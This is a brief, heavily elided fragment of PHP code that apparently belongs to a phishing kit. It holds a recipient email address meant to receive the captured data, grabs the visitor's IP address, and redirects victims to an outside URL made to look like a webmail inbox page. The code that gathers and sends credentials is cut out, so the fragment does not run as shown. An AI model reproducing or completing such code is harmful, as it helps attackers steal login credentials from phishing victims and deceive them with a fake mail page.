...
$recipient = 'chinyua@merchantbrokerage.com'; // Put your email address here
...
$ip = getenv("REMOTE_ADDR");
	...
	if ($result == 1)
		...
		{
		header("Location: https://vienna-way-35764.pancakeapps.com?error&id=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		}
	}
